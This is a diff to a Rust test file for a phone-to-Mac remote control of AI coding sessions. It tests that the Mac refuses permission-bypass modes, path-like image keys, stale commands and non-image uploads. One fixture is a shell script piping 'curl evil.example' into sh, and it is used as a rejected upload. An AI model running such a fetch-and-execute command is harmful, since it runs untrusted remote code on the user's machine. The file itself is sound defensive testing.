@@ -1,8 +1,9 @@
 //! The Mac's half of the threat model and the rules, against a fake relay and a fake app; and the shared vectors.
 
-use crate::mac::{Engine, Host, RelayApi, Saved};
+use crate::live;
+use crate::mac::{ChatView, Engine, Host, RelayApi, Saved};
 use crate::proto::{self, Claim, Dir, Envelope, Identity};
-use crate::rules::{Answer, Cli, Need, Project, SessionInfo, Start, project_id};
+use crate::rules::{Answer, Cli, Delivery, Need, Project, SessionInfo, Start, project_id};
 use serde_json::{Value, json};
 use std::sync::Mutex;
 
@@ -37,6 +38,14 @@ struct FakeHost {
     answers: Mutex<Vec<Answer>>,
     starts: Mutex<Vec<(String, Cli, String)>>,
     needs: Mutex<Vec<Need>>,
+    /// Minor 1: the starts' models and how many images each send or start carried.
+    models: Mutex<Vec<Option<String>>>,
+    atts: Mutex<Vec<Value>>,
+    /// The fake chat's events: (seq, item). `chat_view` returns those after the cursor.
+    events: Mutex<Vec<(u64, Value)>>,
+    live: Mutex<Value>,
+    frames: Mutex<Vec<Vec<u8>>>,
+    stored: Mutex<Vec<(usize, &'static str)>>,
 }
 
 const PROJECT: &str = "/private/tmp/coool-remote-test/app";
@@ -44,8 +53,8 @@ const PROJECT: &str = "/private/tmp/coool-remote-test/app";
 impl Host for FakeHost {
     fn sessions(&self) -> Vec<SessionInfo> {
         vec![
-            SessionInfo { id: "claude:chat1".into(), title: "Invented chat".into(), project: "app".into(), cli: Cli::Claude, state: "idle".into(), model: "haiku".into(), last_activity: 5, chat: true },
-            SessionInfo { id: "claude:term".into(), title: "A terminal session".into(), project: "app".into(), cli: Cli::Claude, state: "idle".into(), model: "".into(), last_activity: 4, chat: false },
+            SessionInfo::new("claude:chat1", "Invented chat", "app", Cli::Claude, "idle", "haiku", 5, true),
+            SessionInfo::new("claude:term", "A terminal session", "app", Cli::Claude, "idle", "", 4, false),
         ]
     }
     fn needs(&self) -> Vec<Need> {
@@ -66,20 +75,56 @@ impl Host for FakeHost {
         self.answers.lock().unwrap().push(a.clone());
         Ok(())
     }
-    fn send(&self, s: &str, text: &str, by: &str) -> Result<(), String> {
-        self.calls.lock().unwrap().push(format!("send {s} {text} by {by}"));
+    fn send(&self, s: &str, text: &str, how: Delivery, atts: &[Value], by: &str) -> Result<(), String> {
+        self.calls.lock().unwrap().push(format!("send {s} {text} by {by}{}", if how == Delivery::Send { String::new() } else { format!(" ({how:?})") }));
+        self.atts.lock().unwrap().extend(atts.iter().cloned());
         Ok(())
     }
     fn stop(&self, s: &str, by: &str) -> Result<(), String> {
         self.calls.lock().unwrap().push(format!("stop {s} by {by}"));
         Ok(())
     }
-    fn start(&self, s: &Start, by: &str) -> Result<String, String> {
+    fn start(&self, s: &Start, atts: &[Value], by: &str) -> Result<String, String> {
         self.calls.lock().unwrap().push(format!("start by {by}"));
         self.starts.lock().unwrap().push((s.project.path.clone(), s.cli, s.mode.to_string()));
+        self.models.lock().unwrap().push(s.model.clone());
+        self.atts.lock().unwrap().extend(atts.iter().cloned());
         Ok("claude:new".into())
     }
     fn changed(&self) {}
+    fn models(&self, cli: Cli) -> Vec<String> {
+        match cli {
+            Cli::Claude => vec!["haiku".into(), "sonnet".into()],
+            Cli::Codex => vec!["gpt-5-codex".into()],
+        }
+    }
+    fn options(&self) -> Value {
+        json!({"claude": {"models": [{"id": "haiku", "label": "Haiku"}], "modes": ["default", "acceptEdits", "plan"]}})
+    }
+    fn overview(&self) -> Value {
+        json!({"projects": [{"name": "app", "working": 1}], "usage": {"claude": {"windows": [{"label": "Session", "percent": 40}]}}})
+    }
+    fn chat_view(&self, session: &str, since: Option<u64>) -> Result<ChatView, String> {
+        if session != "claude:chat1" {
+            return Err("only chats coool runs".into());
+        }
+        let ev = self.events.lock().unwrap();
+        let items = ev.iter().filter(|(q, _)| since.is_none_or(|c| *q > c)).map(|(_, v)| v.clone()).collect();
+        Ok(ChatView { items, cursor: ev.last().map(|(q, _)| *q).unwrap_or(0), live: self.live.lock().unwrap().clone() })
+    }
+    fn chat_image(&self, session: &str, key: &str) -> Result<Vec<u8>, String> {
+        if session == "claude:chat1" && key == "k1" { Ok(vec![0xff, 0xd8, 0xff, 1, 2, 3]) } else { Err("no such image".into()) }
+    }
+    fn device_frame(&self, _session: &str, device: &str) -> Result<Option<Vec<u8>>, String> {
+        if device != "browser" {
+            return Err("that panel isn't open".into());
+        }
+        Ok(self.frames.lock().unwrap().pop())
+    }
+    fn store_image(&self, img: &live::Image) -> Result<Value, String> {
+        self.stored.lock().unwrap().push((img.bytes.len(), img.mime));
+        Ok(json!({"name": "iPhone image.png", "mime": img.mime, "size": img.bytes.len(), "kind": "image", "key": "abc"}))
+    }
 }
 
 impl FakeHost {
@@ -288,7 +333,7 @@ fn a_command_older_than_sixty_seconds_is_dropped_and_reported_expired() {
 }
 
 fn perm_need() -> Need {
-    Need { id: "1:req-1".into(), session: "claude:chat1".into(), kind: "permission".into(), tool: "Bash".into(), summary: "Run echo".into(), command: Some("echo hi".into()), questions: vec![], explanation: None, risk: None }
+    Need { command: Some("echo hi".into()), ..Need::new("1:req-1", "claude:chat1", "permission", "Bash", "Run echo") }
 }
 
 #[test]
@@ -325,9 +370,14 @@ fn start_refuses_unknown_projects_and_paths_and_never_bypasses() {
     let later = NOW + 61_000;
     let (c, ct) = phone.seal(&mac, &mbp, "start", json!({"project": project_id(PROJECT), "cli": "claude", "text": "hi"}), later, 0);
     deliver(&mut mac, &relay, &host, &phone, c, &ct, later);
-    let (c, ct) = phone.seal(&mac, &mbp, "start", json!({"project": project_id(PROJECT), "cli": "codex", "text": "hi", "mode": "danger-full-access"}), later, 0);
-    deliver(&mut mac, &relay, &host, &phone, c, &ct, later);
-    assert_eq!(*host.starts.lock().unwrap(), vec![(PROJECT.to_string(), Cli::Claude, "default".to_string()), (PROJECT.to_string(), Cli::Codex, "untrusted".to_string())]);
+    // Minor 1: a mode the phone names must be an asking one; Bypass and full access are refused, not swapped.
+    for (cli, mode) in [("codex", "danger-full-access"), ("codex", "never"), ("claude", "bypassPermissions"), ("claude", "dontAsk"), ("claude", "")] {
+        let (c, ct) = phone.seal(&mac, &mbp, "start", json!({"project": project_id(PROJECT), "cli": cli, "text": "hi", "mode": mode}), later, 0);
+        deliver(&mut mac, &relay, &host, &phone, c, &ct, later);
+    }
+    assert_eq!(*host.starts.lock().unwrap(), vec![(PROJECT.to_string(), Cli::Claude, "default".to_string())]);
+    let refused = results(&phone, &mac, &mbp, &relay);
+    assert_eq!(refused.iter().filter(|r| r["error"] == "a chat started from the phone can't use that mode").count(), 4, "{refused:?}");
 }
 
 #[test]
@@ -413,6 +463,25 @@ fn matches_the_shared_vectors() {
     let fields: Vec<&str> = fields.iter().map(String::as_str).collect();
     assert_eq!(mac.sign(&proto::request_bytes("send", &fields, 1763640000000)), s("requestSig"));
     assert_eq!(proto::pair_url("https://example.convex.cloud", &s("macId"), &s("pairingId"), &s("secret"), &mac.sign_pub(), &mac.box_pub()), s("pairUrl"));
+    // Minor 1: an image's upload parts, and the last one sealed.
+    let mut bytes = b"\x89PNG\r\n\x1a\n".to_vec();
+    bytes.extend(std::iter::repeat_n(7u8, live::CHUNK));
+    let parts = live::chunks(&bytes, &json!({"upload": "0f0e0d0c0b0a09080706050403020100"}));
+    let want = v["uploadParts"].as_array().unwrap();
+    assert_eq!(parts.len(), want.len());
+    for (p, w) in parts.iter().zip(want) {
+        for k in ["upload", "part", "parts", "size"] {
+            assert_eq!(p[k], w[k], "{k}");
+        }
+        assert_eq!(proto::sha256_hex(p["data"].as_str().unwrap()), w["dataSha256"].as_str().unwrap());
+    }
+    let env: Envelope = serde_json::from_str(&s("uploadEnvelope")).unwrap();
+    assert_eq!(env.b, parts[1]);
+    assert_eq!(proto::seal(sk.d2m.as_ref(), Dir::D2m, &s("macId"), &s("deviceId"), counter + 1, s("uploadEnvelope").as_bytes()).unwrap(), s("sealedUpload"));
+    // The Mac takes those parts as one image.
+    let mut u = live::Uploads::default();
+    assert_eq!(u.take("d", &parts[0], 0), Ok(live::Step::More));
+    assert!(matches!(u.take("d", &parts[1], 0), Ok(live::Step::Done(ref i)) if i.bytes == bytes && i.mime == "image/png"));
 }
 
 #[test]
@@ -428,4 +497,205 @@ fn identity_round_trips_through_the_key_store_form() {
 fn a_low_order_peer_key_is_refused() {
     let id = Identity::generate();
     assert!(id.shared(&proto::b64u(&[0u8; 32])).is_err());
+}
+
+// ---------------------------------------------------------------- minor 1
+
+fn send_all(mac: &mut Engine, mbp: &str, relay: &FakeRelay, host: &FakeHost, phone: &mut TestPhone, msgs: Vec<(&str, Value)>, now: u64) {
+    for (t, b) in msgs {
+        let (c, ct) = phone.seal(mac, mbp, t, b, now, 0);
+        deliver(mac, relay, host, phone, c, &ct, now);
+    }
+}
+
+#[test]
+fn a_start_takes_a_model_and_mode_the_mac_offers() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    let p = project_id(PROJECT);
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
+        ("start", json!({"project": p, "cli": "claude", "text": "hi", "model": "haiku", "mode": "plan"})),
+        ("start", json!({"project": p, "cli": "claude", "text": "hi", "model": "claude-opus-9-unknown"})),
+        ("start", json!({"project": p, "cli": "codex", "text": "hi", "model": "haiku"})),
+        ("start", json!({"project": p, "cli": "codex", "text": "hi", "model": "gpt-5-codex", "mode": "on-request"})),
+    ], NOW);
+    assert_eq!(*host.starts.lock().unwrap(), vec![(PROJECT.to_string(), Cli::Claude, "plan".to_string()), (PROJECT.to_string(), Cli::Codex, "on-request".to_string())]);
+    assert_eq!(*host.models.lock().unwrap(), vec![Some("haiku".to_string()), Some("gpt-5-codex".to_string())]);
+    let rs = results(&phone, &mac, &mbp, &relay);
+    assert_eq!(rs.iter().filter(|r| r["error"] == "not a model this Mac offers").count(), 2);
+    assert_eq!(rs[0]["model"], "haiku");
+}
+
+#[test]
+fn hello_with_minor_gets_options_and_overview_and_an_old_phone_does_not() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("hello", json!({"name": "x"}))], NOW);
+    let ts: Vec<String> = phone.received(&mac, &mbp, &relay).into_iter().map(|e| e.t).collect();
+    assert_eq!(ts, vec!["snapshot", "projects"], "an older phone gets only what it knows");
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("hello", json!({"name": "x", "minor": 1}))], NOW + 10);
+    let got = phone.received(&mac, &mbp, &relay);
+    let ts: Vec<&str> = got.iter().map(|e| e.t.as_str()).collect();
+    assert_eq!(&ts[2..], ["snapshot", "projects", "options", "overview"]);
+    assert_eq!(got[2].b["minor"], 1);
+    // The overview goes again only when it changed.
+    mac.tick(&relay, &host, NOW + 5_000);
+    mac.tick(&relay, &host, NOW + 10_000);
+    let n = phone.received(&mac, &mbp, &relay).iter().filter(|e| e.t == "overview").count();
+    assert_eq!(n, 2, "once at hello, once on the first tick (the engine hadn't sent it yet), then not again");
+}
+
+#[test]
+fn an_unknown_message_type_is_ignored_both_ways() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("teleport", json!({"session": "claude:chat1"})), ("watch_v9", json!({}))], NOW);
+    assert!(host.calls().is_empty());
+    assert!(phone.received(&mac, &mbp, &relay).is_empty(), "no answer, no error: either side can be newer");
+    assert!(mac.actions.is_empty());
+}
+
+#[test]
+fn a_watched_chat_streams_its_changes_until_the_lease_ends() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    host.events.lock().unwrap().push((1, json!({"k": "u1", "role": "user", "text": "hi"})));
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch", json!({"session": "claude:chat1"}))], NOW);
+    let chats = |m: &Engine, r: &FakeRelay| phone.received(m, &mbp, r).into_iter().filter(|e| e.t == "chat").map(|e| e.b).collect::<Vec<_>>();
+    let c = chats(&mac, &relay);
+    assert_eq!(c.len(), 1);
+    assert_eq!((c[0]["reset"].as_bool(), c[0]["items"][0]["k"].as_str(), c[0]["cursor"].as_u64()), (Some(true), Some("u1"), Some(1)));
+    // Nothing new: nothing sent. Something new: only that.
+    mac.tick(&relay, &host, NOW + 1_000);
+    assert_eq!(chats(&mac, &relay).len(), 1);
+    host.events.lock().unwrap().push((2, json!({"k": "t1", "role": "tool", "tool": "Edit", "text": "src/a.rs"})));
+    *host.live.lock().unwrap() = json!({"text": "Writing", "step": "Edit src/a.rs"});
+    mac.tick(&relay, &host, NOW + 2_000);
+    let c = chats(&mac, &relay);
+    assert_eq!(c.len(), 2);
+    assert_eq!((c[1]["reset"].as_bool(), c[1]["items"].as_array().unwrap().len(), c[1]["live"]["step"].as_str()), (Some(false), 1, Some("Edit src/a.rs")));
+    // Only the live part changed (streaming text): it goes too.
+    *host.live.lock().unwrap() = json!({"text": "Writing the", "step": "Edit src/a.rs"});
+    mac.tick(&relay, &host, NOW + 3_000);
+    assert_eq!(chats(&mac, &relay).len(), 3);
+    // The lease runs out without a renewal: nothing more.
+    host.events.lock().unwrap().push((3, json!({"k": "a1", "role": "assistant", "text": "done"})));
+    mac.tick(&relay, &host, NOW + live::LEASE_MS + 1);
+    assert_eq!(chats(&mac, &relay).len(), 3);
+}
+
+#[test]
+fn watching_reaches_only_chats_coool_runs() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
+        ("watch", json!({"session": "claude:term"})),
+        ("watch_device", json!({"session": "claude:term", "device": "browser"})),
+        ("get_image", json!({"session": "claude:term", "key": "k1"})),
+        ("watch", json!({"session": "/Users/someone/project"})),
+    ], NOW);
+    let got = phone.received(&mac, &mbp, &relay);
+    assert!(got.iter().all(|e| e.t == "result" && e.b["ok"] == false), "{got:?}");
+    assert_eq!(got.len(), 4);
+}
+
+#[test]
+fn an_image_of_a_chat_goes_only_by_its_key_in_chunks() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
+        ("get_image", json!({"session": "claude:chat1", "key": "k1"})),
+        ("get_image", json!({"session": "claude:chat1", "key": "/etc/hosts"})),
+    ], NOW);
+    let got = phone.received(&mac, &mbp, &relay);
+    let img: Vec<&Envelope> = got.iter().filter(|e| e.t == "image").collect();
+    assert_eq!(img.len(), 1);
+    assert_eq!(proto::unb64u(img[0].b["data"].as_str().unwrap(), None).unwrap(), vec![0xff, 0xd8, 0xff, 1, 2, 3]);
+    assert_eq!(got.iter().filter(|e| e.t == "result" && e.b["ok"] == false).count(), 1);
+}
+
+#[test]
+fn device_frames_flow_while_watched_and_only_when_changed() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    *host.frames.lock().unwrap() = vec![vec![0xff, 0xd8, 0xff, 9], vec![0xff, 0xd8, 0xff, 9], vec![0xff, 0xd8, 0xff, 8]];
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch_device", json!({"session": "claude:chat1", "device": "browser"}))], NOW);
+    assert_eq!(mac.actions.last().unwrap().detail, "watched the Browser panel (view only)");
+    for i in 1..=4 {
+        mac.tick(&relay, &host, NOW + i * live::FRAME_MS);
+    }
+    let frames: Vec<Value> = phone.received(&mac, &mbp, &relay).into_iter().filter(|e| e.t == "frame").map(|e| e.b).collect();
+    assert_eq!(frames.len(), 2, "the same picture twice goes once");
+    assert_eq!((frames[0]["seq"].as_u64(), frames[1]["seq"].as_u64()), (Some(1), Some(2)));
+    // A renewal is not a new stream: recorded once.
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch_device", json!({"session": "claude:chat1", "device": "browser"}))], NOW + 11_000);
+    assert_eq!(mac.actions.iter().filter(|a| a.kind == "watch").count(), 1);
+    // Unknown panels are refused, and there is no input to send: an input message is just ignored.
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("watch_device", json!({"session": "claude:chat1", "device": "terminal"})), ("device_input", json!({"session": "claude:chat1", "x": 1, "y": 2}))], NOW + 12_000);
+    let rs = results(&phone, &mac, &mbp, &relay);
+    assert_eq!(rs.len(), 1);
+    assert_eq!(rs[0]["error"], "unknown device panel");
+}
+
+fn upload_parts(id: &str, bytes: &[u8]) -> Vec<Value> {
+    live::chunks(bytes, &json!({"upload": id}))
+}
+
+#[test]
+fn an_image_from_the_phone_is_stored_once_and_used_by_a_send() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
+    png.resize(live::CHUNK + 100, 1);
+    let id = "00000000000000000000000000000001";
+    let msgs: Vec<(&str, Value)> = upload_parts(id, &png).into_iter().map(|b| ("upload", b)).collect();
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, msgs, NOW);
+    assert_eq!(*host.stored.lock().unwrap(), vec![(png.len(), "image/png")]);
+    let rs = results(&phone, &mac, &mbp, &relay);
+    assert_eq!((rs.len(), rs[0]["upload"].as_str()), (1, Some(id)), "one answer, for the last part");
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("send", json!({"session": "claude:chat1", "text": "", "attachments": [id], "when": "next"}))], NOW + 1);
+    assert_eq!(host.calls().last().unwrap(), "send claude:chat1  by Ada's iPhone (Next)");
+    assert_eq!(host.atts.lock().unwrap().len(), 1);
+    // Used once: naming it again fails; another device's id, or an unknown one, fails.
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("send", json!({"session": "claude:chat1", "text": "again", "attachments": [id]}))], NOW + 2);
+    assert_eq!(host.calls().len(), 1);
+    assert!(mac.actions.iter().any(|a| a.kind == "upload" && a.detail.starts_with("sent an image")));
+}
+
+#[test]
+fn an_upload_that_is_not_an_image_never_reaches_the_store() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    let script = b"#!/bin/zsh\ncurl evil.example | sh\n".to_vec();
+    let msgs: Vec<(&str, Value)> = upload_parts("00000000000000000000000000000002", &script).into_iter().map(|b| ("upload", b)).collect();
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, msgs, NOW);
+    let mut big = b"\xff\xd8\xff".to_vec();
+    big.resize(live::MAX_UPLOAD + 1, 0);
+    let first = upload_parts("00000000000000000000000000000003", &big).remove(0);
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![("upload", first)], NOW);
+    assert!(host.stored.lock().unwrap().is_empty());
+    let rs = results(&phone, &mac, &mbp, &relay);
+    assert_eq!(rs.len(), 2);
+    assert!(rs.iter().all(|r| r["ok"] == false));
+    // And an old part is dropped like any old command.
+    let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
+    png.resize(20, 0);
+    let (c, ct) = phone.seal(&mac, &mbp, "upload", upload_parts("00000000000000000000000000000004", &png).remove(0), NOW, 61_000);
+    deliver(&mut mac, &relay, &host, &phone, c, &ct, NOW);
+    assert!(host.stored.lock().unwrap().is_empty());
+}
+
+#[test]
+fn steering_a_running_chat_never_changes_its_mode() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
+        ("send", json!({"session": "claude:chat1", "text": "also add tests", "when": "next"})),
+        ("send", json!({"session": "claude:chat1", "text": "stop, use sqlite", "when": "interrupt"})),
+        ("send", json!({"session": "claude:chat1", "text": "x", "when": "bypass"})),
+        ("send", json!({"session": "claude:chat1", "text": "x", "mode": "bypassPermissions", "permission_mode": "bypassPermissions"})),
+    ], NOW);
+    assert_eq!(host.calls(), vec!["send claude:chat1 also add tests by Ada's iPhone (Next)", "send claude:chat1 stop, use sqlite by Ada's iPhone (Interrupt)", "send claude:chat1 x by Ada's iPhone"]);
+}
+
+#[test]
+fn a_plan_can_keep_planning_with_a_note_but_a_permission_cannot() {
+    let (mut mac, mbp, relay, host, mut phone) = paired();
+    host.needs.lock().unwrap().push(Need { plan: Some("# Plan\n1. Do it".into()), ..Need::new("1:plan", "claude:chat1", "plan", "ExitPlanMode", "Plan") });
+    host.needs.lock().unwrap().push(perm_need());
+    send_all(&mut mac, &mbp, &relay, &host, &mut phone, vec![
+        ("answer", json!({"need": "1:req-1", "choice": "keep_planning", "note": "x"})),
+        ("answer", json!({"need": "1:plan", "choice": "keep_planning", "note": "Use SQLite instead"})),
+    ], NOW);
+    assert_eq!(*host.answers.lock().unwrap(), vec![Answer::KeepPlanning(Some("Use SQLite instead".into()))]);
 }
